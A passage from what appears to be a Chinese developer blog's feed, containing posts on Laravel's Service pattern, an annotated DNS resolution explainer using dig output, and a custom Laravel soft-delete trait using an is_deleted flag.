\App\Services\EmailService</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $orderService;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * UserController constructor.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> \App\Services\OrderService $orderService</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(OrderService $orderService)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;orderService = $orderService;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> \Illuminate\Http\Request $request</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> int</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $number = $request-&gt;input(<span class="string">'number'</span>);</span><br><span class="line">        $discount = <span class="keyword">$this</span>-&gt;orderService-&gt;getDisCount($number);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;orderService-&gt;getTotal($number, $discount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将原本的 <code>if () { .. } else { .. }</code> 逻辑改写成使用 <code>OrderService</code>，<code>Controller</code> 变得非常干净，也达成原来 <code>Controller</code><br>接受 <code>Http Request</code>，调用其他 <code>Class</code> 的责任。</p><p>改用这种写法的几个优点：</p><ol><li>将 PHP 写的业务逻辑写在　Service ，解决了 Controller 代码臃肿的问题</li><li>符合 SOLID 的单一职责原则： 业务逻辑写在 Service，没写在 Controller</li><li>符合 SOLID 的单一职责原则：计算折扣与计算加总分开在不同的 Method，且归属于 OrderService，而非 Controller</li><li>符合 SOLID 的依赖反转原则： Controller 并非直接相依于 Service，而是将 Service 依赖注入进 Controller</li><li>其他 Controller 也可以重复使用这段业务逻辑</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>实际上会有很多 Service ，需要自行依照 <strong>SOLID</strong> 原则去判断是否该建立 Service</li><li>Service 使得业务逻辑从 Controller 中解放，不仅更容易维护、更容易拓展、更容易重复使用且更容易测试</li></ul><h2 id="原文链接"><a href="#原文链接" class="headerlink" title="原文链接"></a>原文链接</h2><ul><li><a href="https://oomusou.io/laravel/service/" target="_blank" rel="noopener">如何使用Service？</a></li><li><a href="https://blog.csdn.net/qq_24935119/article/details/89658281" target="_blank" rel="noopener">如何使用 Service 模式?</a></li><li><a href="https://github.com/oomusou/Laravel51ServiceExternal_demo" target="_blank" rel="noopener">项目地址</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;若将数据库逻辑都写在 &lt;code&gt;Controller&lt;/code&gt; 里，会造成 &lt;code&gt;Controller&lt;/code&gt; 代码的臃肿难以维护，基于 &lt;code&gt;SOLID&lt;/code&gt; 原则，我们应该使用 &lt;code&gt;Service&lt;/code&gt; 模式辅助 &lt;code&gt;Controller&lt;/code&gt;，将相关的业务逻辑封装在不同的 &lt;code&gt;Service&lt;/code&gt;，方便项目的后期维护。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    <category term="Laravel" scheme="https://www.0x2beace.com/categories/PHP/Laravel/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Laravel" scheme="https://www.0x2beace.com/tags/Laravel/"/>
    
  </entry>
  
  <entry>
    <title>『转载』域名背后那些事</title>
    <link href="https://www.0x2beace.com/those-things-behind-the-domain-name/"/>
    <id>https://www.0x2beace.com/those-things-behind-the-domain-name/</id>
    <published>2021-04-11T07:14:30.000Z</published>
    <updated>2021-04-11T07:16:33.330Z</updated>
    
    <content type="html"><![CDATA[<p>互联网中的地址是数字的 IP 地址，例如<code>61.135.169.125</code>就是百度的官网地址之一，如果每次访问百度都需要输入 IP 的话，估计到今天互联网都还没有走出鸿蒙阶段。</p><a id="more"></a><p>在网络发展历史上，最开始确实就是直接使用 IP 地址来访问远程主机的。早期联网的每台计算机都是采用主机文件（即我们俗称的 hosts 文件）来进行地址配置和解析的，后来联网机器越来越多，主机文件的更新和同步就成了很大的问题。于是，1983 年保罗·莫卡派乔斯发明了域名解析服务和域名系统，在 1985 年 1 月 1 日，世界上第一个域名 <a href="http://nordu.net/" target="_blank" rel="noopener">nordu.net</a> 才被注册成功。</p><p>域名比 IP 地址更容易记忆，本质上只是为数字化的互联网资源提供了易于记忆的别名，就像在北京提起「故宫博物院」就都知道指的是「东城区景山前街 4 号」的那个大院子一样。如果把 IP 地址看成电话号码，那域名系统就是通讯录。我们在通讯录里保存了朋友和家人的信息，每次通过名字找到某人打电话的时候，通讯录就会查出与之关联的电话号码，然后拨号过去。我们可能记不下多少完整的电话号码，但是联系人的名字却是一定记得的。</p><p>既然「域名」只是一个别名，单凭这一个名字我们并不能访问到正确的地址，只有能将域名解析成实际的网络地址，网络访问才能成功。这种解析工作由专门的「域名系统」（Domain Name System，简称 DNS）完成，DNS 也是互联网的核心基础服务之一。</p><h2 id="域名解析是怎么完成的"><a href="#域名解析是怎么完成的" class="headerlink" title="域名解析是怎么完成的"></a>域名解析是怎么完成的</h2><p>DNS 解析的过程是什么样子的呢？在开始这个问题之前，我们先看一看域名的层次结构。</p><h3 id="域名的层级结构"><a href="#域名的层级结构" class="headerlink" title="域名的层级结构"></a>域名的层级结构</h3><p>在讨论域名的时候，我们经常听到有人说「顶级域名」、「一级域名」、「二级域名」等概念，域名级别究竟是怎么划分的呢？</p><ul><li>根域名。还是以百度为例，通过一些域名解析工具，我们可以看到百度官网域名显示为 <code>www.baidu.com.</code>，细心的人会注意到，这里最后有一个 <code>.</code>，这不是 bug，而是所有域名的尾部都有一个根域名。<code>www.baidu.com</code> 真正的域名是 <code>www.baidu.com.root</code>，简写为<code>www.baidu.com</code>.，又因为根域名 <code>.root</code>对于所有域名都是一样的，所以平时是省略的，最终就变成了我们常见的样子。</li><li>根域名的下一级叫做顶级域名（top-level domain，缩写为 TLD），也叫做一级域名，常见的如 <code>.com/</code>、<code>.net/</code>、<code>.org/</code>、<code>.cn/</code> 等等，他们就是顶级域名。</li><li>再下一级叫做二级域名（second-level domain，缩写为 SLD），比如 <code>baidu.com</code>。这是我们能够购买和注册的最高级域名。<br>次级域名之下，就是主机名（host），也可以称为三级域名，比如 <code>www.baidu.com</code>，由此往下，基本上 N 级域名就是在 N-1 级域名前追加一级。</li></ul><p>总结一下，常见的域名层级结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">主机名.次级域名.顶级域名.根域名</span><br><span class="line">www.baidu.com.root</span><br></pre></td></tr></table></figure><p>一般来说我们购买一个域名就是购买一个二级域名（SLD）的管理权（如 0x2beace.com），有了这个管理权我们就可以随意设置三级、四级域名了。</p><h3 id="域名解析的过程"><a href="#域名解析的过程" class="headerlink" title="域名解析的过程"></a>域名解析的过程</h3><p>与域名的分级结构对应，DNS 系统也是一个树状结构，不同级别的域名由不同的域名服务器来解析，整个过程是一个「层级式」的。</p><p>层级式域名解析体系的第一层就是根域名服务器，全世界 IPv4 根域名服务器只有 13 台（名字分别为 A 至 M），1 个为主根服务器在美国，其余 12 个均为辅根服务器，它们负责管理世界各国的域名信息。在根服务器下面是顶级域名服务器，即相关国家域名管理机构的数据库，如中国互联网络信息中心（CNNIC）。然后是再下一级的权威域名服务器和 ISP 的缓存服务器。</p><p>一个域名必须首先经过根数据库的解析后，才能转到顶级域名服务器进行解析，这一点与生活中问路的情形有几分相似。</p><p>假设北京市设立了一个专门的「道路咨询局」，里面设置了局长、部长、处长、科员好几个级别的公务员，不同的部门、科室、人员负责解答不同区域的道路问题。这里的人都有一个共同特点，信奉「好记性不如烂笔头」的哲理，喜欢将自己了解到的信息记录到笔记本上。但是有一点遗憾的是，他们写字用的墨水只有一种，叫「魔术墨水」，初写字迹浓厚，之后会慢慢变淡，1 小时之后则会完全消失。道路咨询局门口还有一个门卫大爷，所有的人要问路都需要通过他来传达和回复，市民并不能进入办公楼。</p><p>如果市民 A 先生来找门卫大爷询问「北海公园」的地址，门卫大爷会先看一下自己的笔记本，找找看之前有没有人问过北海公园，如果没有，他就会拨打内线去找局长求助。局长说北海是西城区，你去问负责西城区道路信息的赵部长吧。门卫大爷又去问赵部长，赵部长查了一下，说这个地址你去问负责核心区的钱处长吧。门卫大爷又给钱处长打过去电话，钱处长说这个地址我也不掌握啊，你去问一下负责景山片区的科员小孙吧。门卫大爷从小孙那里终于知道了北海公园地址，他赶紧记到自己的小本本上，然后把结果告诉了市民 A 先生。接下来一小时内，如果还有市民 B 先生再来问北海公园的话，门卫大爷就直接用笔记本上记载的结果回复了。当然，如果市民 C 女士过来问别的地址的话，门卫大爷就要把处理 A 先生问询的流程再走一遍了。</p><h3 id="分级查询的实例"><a href="#分级查询的实例" class="headerlink" title="分级查询的实例"></a>分级查询的实例</h3><p>现在我们来看一个实际的例子。如果我们在浏览器中输入<code>https://news.qq.com</code>，那浏览器会从接收到的 URL 中抽取出域名字段（news.qq.com），然后将它传给 DNS 客户端（操作系统提供）来解析。</p><p>首先我们说明一下本机 DNS 配置（就是 <code>/etc/resolv.conf</code> 文件，里面指定了本地 DNS 服务器的地址，Windows 系统可能会有所不同）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat /etc/resolv.conf </span></span><br><span class="line">nameserver 202.106.0.20</span><br><span class="line">nameserver 202.106.196.115</span><br></pre></td></tr></table></figure><p>然后我们用 dig 这个工具查看一下 news.qq.com 的解析结果（其中中文部分是解释说明）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">$ dig news.qq.com</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; news.qq.com</span><br><span class="line">这是 dig 程序的版本号与要查询的域名</span><br><span class="line"></span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">以下是要获取的内容。</span><br><span class="line"></span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 47559</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 0</span><br><span class="line">这个是返回应答的头部信息：</span><br><span class="line">1. opcode：操作码，QUERY 代表查询操作；</span><br><span class="line">2. status: 状态，NOERROR 代表没有错误;</span><br><span class="line">3. id：编号，在 DNS 协议中通过编号匹配返回和查询；</span><br><span class="line">4. flags: 标志，含义如下:</span><br><span class="line">   - qr：query，查询标志，代表是查询操作</span><br><span class="line">   - rd：recursion desired，代表希望进行递归查询操作;</span><br><span class="line">   - ra：recursive available，代表查询的服务器支持递归查询操作;</span><br><span class="line">5. QUERY 查询数，与下面 QUESTION SECTION 的记录数一一对应；</span><br><span class="line">6. ANSWER 结果数，与下面的 ANSWER SECTION 的记录数一一对应；</span><br><span class="line">7. AUTHORITY 权威回复数，如果查询结果由管理域名的域名服务器而不是缓存服务器提供的，则称为权威回复。</span><br><span class="line">             0 表示所有结果都不是权威回复；</span><br><span class="line">8. ADDITIONAL 额外记录数；</span><br><span class="line"></span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;news.qq.com.INA</span><br><span class="line">查询部分,从左到右部分意义如下:</span><br><span class="line">1、要查询的域名；</span><br><span class="line">2、要查询信息的类别，IN 代表类别为 IP 协议，即 Internet。</span><br><span class="line">3、查询的记录类型，A 记录(Address)代表要查询 IPv4 地址。</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">news.qq.com.136INCNAMEhttps.qq.com.</span><br><span class="line">https.qq.com.476INA125.39.52.26</span><br><span class="line">回应部分，从左到右各部分意义：</span><br><span class="line">1、对应的域名</span><br><span class="line">2、TTL，time to live，缓存时间，单位秒，代表缓存域名服务器可以在缓存中保存的期限。</span><br><span class="line">3、查询信息的类别</span><br><span class="line">4、查询的记录类型，CNAME 表示别名记录，A 记录(Address)代表 IPv4 地址。</span><br><span class="line">5、域名对应的 ip 地址。</span><br><span class="line"></span><br><span class="line">;; Query time: 56 msec</span><br><span class="line">;; SERVER: 202.106.0.20#53(202.106.0.20)</span><br><span class="line">查询使用的服务器地址和端口,其实就是本地 DNS 域名服务器</span><br><span class="line">;; WHEN: Thu Jul 11 15:59:37 CST 2019</span><br><span class="line">;; MSG SIZE  rcvd: 65</span><br><span class="line">查询的时间与回应的大小，收到 65 字节的应答数据。</span><br></pre></td></tr></table></figure><p>从这个应答可以看到，我们得到的结果不是权威回复，只是本地 DNS 服务器从缓存中给了应答。</p><p>接下来我们在 dig 命令中增加一个参数 <code>+trace</code>，看看完整的分级查询过程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">$ dig +trace news.qq.com</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; +trace news.qq.com</span><br><span class="line">;; global options: +cmd</span><br><span class="line">.432944INNSg.root-servers.net.</span><br><span class="line">.432944INNSk.root-servers.net.</span><br><span class="line">.432944INNSb.root-servers.net.</span><br><span class="line">.432944INNSh.root-servers.net.</span><br><span class="line">.432944INNSi.root-servers.net.</span><br><span class="line">.432944INNSf.root-servers.net.</span><br><span class="line">.432944INNSd.root-servers.net.</span><br><span class="line">.432944INNSe.root-servers.net.</span><br><span class="line">.432944INNSj.root-servers.net.</span><br><span class="line">.432944INNSl.root-servers.net.</span><br><span class="line">.432944INNSc.root-servers.net.</span><br><span class="line">.432944INNSm.root-servers.net.</span><br><span class="line">.432944INNSa.root-servers.net.</span><br><span class="line">;; Received 228 bytes from 202.106.0.20#53(202.106.0.20) in 45 ms</span><br><span class="line">这些就是神秘的根域名服务器，由本地 DNS 服务器返回了所有根域名服务器地址。</span><br><span class="line"></span><br><span class="line">com.172800INNSg.gtld-servers.net.</span><br><span class="line">com.172800INNSa.gtld-servers.net.</span><br><span class="line">com.172800INNSb.gtld-servers.net.</span><br><span class="line">com.172800INNSm.gtld-servers.net.</span><br><span class="line">com.172800INNSd.gtld-servers.net.</span><br><span class="line">com.172800INNSc.gtld-servers.net.</span><br><span class="line">com.172800INNSj.gtld-servers.net.</span><br><span class="line">com.172800INNSh.gtld-servers.net.</span><br><span class="line">com.172800INNSf.gtld-servers.net.</span><br><span class="line">com.172800INNSl.gtld-servers.net.</span><br><span class="line">com.172800INNSe.gtld-servers.net.</span><br><span class="line">com.172800INNSk.gtld-servers.net.</span><br><span class="line">com.172800INNSi.gtld-servers.net.</span><br><span class="line">;; Received 1171 bytes from 192.36.148.17#53(i.root-servers.net) in 57 ms</span><br><span class="line">这里显示的是 .com 域名的 13 条 NS 记录，本地 DNS 服务器向这些顶级域名服务器发出查询请求，</span><br><span class="line">询问 qq.com 的 NS 记录。</span><br><span class="line"></span><br><span class="line">qq.com.172800INNSns1.qq.com.</span><br><span class="line">qq.com.172800INNSns2.qq.com.</span><br><span class="line">qq.com.172800INNSns3.qq.com.</span><br><span class="line">qq.com.172800INNSns4.qq.com.</span><br><span class="line">;; Received 805 bytes from 192.48.79.30#53(j.gtld-servers.net) in 331 ms</span><br><span class="line">这里显示的是 qq.com 的 4 条 NS 记录，由 j.gtld-servers.net 这台服务器最先返回。</span><br><span class="line">然后本地 DNS 服务器向这四台服务器查询下一级域名 news.qq.com 的 NS 记录。</span><br><span class="line"></span><br><span class="line">news.qq.com.86400INNSns-cnc1.qq.com.</span><br><span class="line">news.qq.com.86400INNSns-cnc2.qq.com.</span><br><span class="line">;; Received 180 bytes from 58.144.154.100#53(ns4.qq.com) in 37 ms</span><br><span class="line">这里显示的是 news.qq.com 的 NS 记录，它们是由上面的 ns4.qq.com 域名服务器返回的。</span><br><span class="line">然后本地 DNS 服务器向这两台机器查询 news.qq.com 的主机名。</span><br><span class="line"></span><br><span class="line">news.qq.com.600INCNAMEhttps.qq.com.</span><br><span class="line">https.qq.com.600INA125.39.52.26</span><br><span class="line">;; Received 76 bytes from 223.167.83.104#53(ns-cnc2.qq.com) in 29 ms</span><br><span class="line">这是上面的 ns-cnc2.qq.com 返回的最终查询结果：</span><br><span class="line">news.qq.com 是 https.qq.com 的别名，而 https.qq.com 的 A 记录地址是 125.39.52.26</span><br></pre></td></tr></table></figure><p>实际的流程里面，本地 DNS 服务器相当于门卫大爷，根域名服务器相当于局长同志，其余以此类推。客户端与本地 DNS 服务器之间的查询叫递归查询，本地 DNS 服务器与其他域名服务器之间的查询就叫迭代查询。</p><h2 id="域名记录的类型"><a href="#域名记录的类型" class="headerlink" title="域名记录的类型"></a>域名记录的类型</h2><p>域名服务器之所以能知道域名与 IP 地址的映射信息，是因为我们在域名服务商那里提交了域名记录。购买了一个域名之后，我们需要在域名服务商那里设置域名解析的记录，域名服务商把这些记录推送到权威域名服务器，这样我们的域名才能正式生效。</p><p>在设置域名记录的时候，会遇到「A 记录」、「CNAME」 等不同类型，这正是前面做域名解析的时候我们碰到的结果。这些类型是什么意思，它们之间有什么区别呢？接下来我们看看常见的记录类型。</p><ul><li><strong>A 记录</strong>。A (Address) 记录用来直接指定主机名（或域名）对应的 IP 地址。主机名就是域名前缀，常见有如下几种：<ul><li><code>www</code>：解析后的域名为 <a href="http://www.0x2beace.com，一般用于网站地址。" target="_blank" rel="noopener">www.0x2beace.com，一般用于网站地址。</a></li><li><code>@</code>：直接解析主域名。</li><li><code>*</code>：泛解析，指将 *.yourdomain.com 解析到同一 IP。</li></ul></li><li><strong>CNAME 记录</strong>。CNAME 的全称是 Canonical Name，通常称别名记录。如果需要将域名指向另一个域名，再由另一个域名提供 IP 地址，就需要添加 CNAME 记录。</li><li>MX 记录。邮件交换记录，用于将以该域名为结尾的电子邮件指向对应的邮件服务器以进行处理。</li><li>NS 记录。域名服务器记录，如果需要把子域名交给其他 DNS 服务器解析，就需要添加 NS 记录。</li><li>AAAA 记录。用来指定主机名（或域名）对应的 IPv6 地址，不常用。</li><li>TXT 记录。可以填写任何东西，长度限制 255。绝大多数的 TXT 记录是用来做 SPF 记录（反垃圾邮件），MX 记录的作用是给寄信者指明某个域名的邮件服务器有哪些。SPF 的作用跟 MX 相反，它向收信者表明，哪些邮件服务器是经过某个域名认可会发送邮件的。</li><li>显性 URL。从一个地址 301 重定向（也叫「永久性转移」）到另一个地址的时候，就需要添加显性 URL 记录。</li><li>隐性 URL。从一个地址 302 跳转（也叫「临时跳转」）到另一个地址，需要添加隐性 URL 记录。它类似于显性 URL，区别在于隐性 URL 不会改变地址栏中的域名。</li></ul><p>在填写各种记录的时候，我们还会碰到一个特殊的设置项——TTL，生存时间（Time To Live）。</p><p>TTL表示解析记录在 DNS 服务器中的缓存时间，时间长度单位是秒，一般为3600秒。比如：在访问<code>news.qq.com</code> 时，如果在 DNS 服务器的缓存中没有该记录，就会向某个 NS 服务器发出请求，获得该记录后，该记录会在 DNS 服务器上保存TTL的时间长度，在TTL有效期内访问 <code>news.qq.com</code>，DNS 服务器会直接缓存中返回刚才的记录。</p><h2 id="原文链接"><a href="#原文链接" class="headerlink" title="原文链接"></a>原文链接</h2><ul><li><a href="https://leancloudblog.com/Domain-Name-Story-confirm/" target="_blank" rel="noopener">域名背后那些事</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;互联网中的地址是数字的 IP 地址，例如&lt;code&gt;61.135.169.125&lt;/code&gt;就是百度的官网地址之一，如果每次访问百度都需要输入 IP 的话，估计到今天互联网都还没有走出鸿蒙阶段。&lt;/p&gt;</summary>
    
    
    
    
    <category term="域名" scheme="https://www.0x2beace.com/tags/%E5%9F%9F%E5%90%8D/"/>
    
  </entry>
  
  <entry>
    <title>如何更好的使用 Laravel 软删除</title>
    <link href="https://www.0x2beace.com/how-to-better-use-laravel-soft-delete/"/>
    <id>https://www.0x2beace.com/how-to-better-use-laravel-soft-delete/</id>
    <published>2021-04-10T12:26:01.000Z</published>
    <updated>2021-04-10T12:27:07.466Z</updated>
    
    <content type="html"><![CDATA[<p>通常对于数据库中比较重要的数据，不会直接删除，而是采用软删除。</p><a id="more"></a><p>Laravel 的Eloquent 也提供相应的功能达到软删除模型的目的，不过个人觉得Laravel 的软删除存在一些问题：</p><blockquote><p>Laravel中使用了一个日期字段作为标识状态，<code>deleted_at</code> 默认值为<code>NULL</code>，如果记录被删除了，<code>deleted_at</code> 的值则为当前时间戳，所以只能通过<code>is null</code> or <code>not is null</code>查询一条记录是否被删除，这会导致Mysql 引擎放弃使用索引而进行全表扫描，查询效率可想而知。</p></blockquote><p>可以通过重写<code>SoftDeletes.php</code> 类来修改Laravel SoftDelete 的逻辑：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Models</span>\<span class="title">Traits</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">SoftDeletes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">trait</span> SoftDeletesEx &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">use</span> <span class="title">SoftDeletes</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Boot the soft deleting trait for a model.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">bootSoftDeletes</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">static</span>::addGlobalScope(<span class="keyword">new</span> SoftDeletingScopeEx());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the name of the "deleted at" column.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getDeletedAtColumn</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 自定义标识字段</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'is_deleted'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Perform the actual delete query on this model instance.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">runSoftDelete</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $query = <span class="keyword">$this</span>-&gt;newQueryWithoutScopes()-&gt;where(<span class="keyword">$this</span>-&gt;getKeyName(), <span class="keyword">$this</span>-&gt;getKey());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 0. 正常 1. 已删除</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;getDeletedAtColumn()&#125; = $time = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        $query-&gt;update([</span><br><span class="line">            <span class="keyword">$this</span>-&gt;getDeletedAtColumn() =&gt; $time</span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Restore a soft-deleted model instance.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> bool|null</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">restore</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// If the restoring event does not return false, we will proceed with this</span></span><br><span class="line">        <span class="comment">// restore operation. Otherwise, we bail out so the developer will stop</span></span><br><span class="line">        <span class="comment">// the restore totally. We will clear the deleted timestamp and save.</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;fireModelEvent(<span class="string">'restoring'</span>) === <span class="keyword">false</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;getDeletedAtColumn()&#125; = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Once we have saved the model, we will fire the "restored" event so this</span></span><br><span class="line">        <span class="comment">// developer will do anything they need to after a restore operation is</span></span><br><span class="line">        <span class="comment">// totally finished. Then we will return the result of the save call.</span></span><br><span class="line">        <span 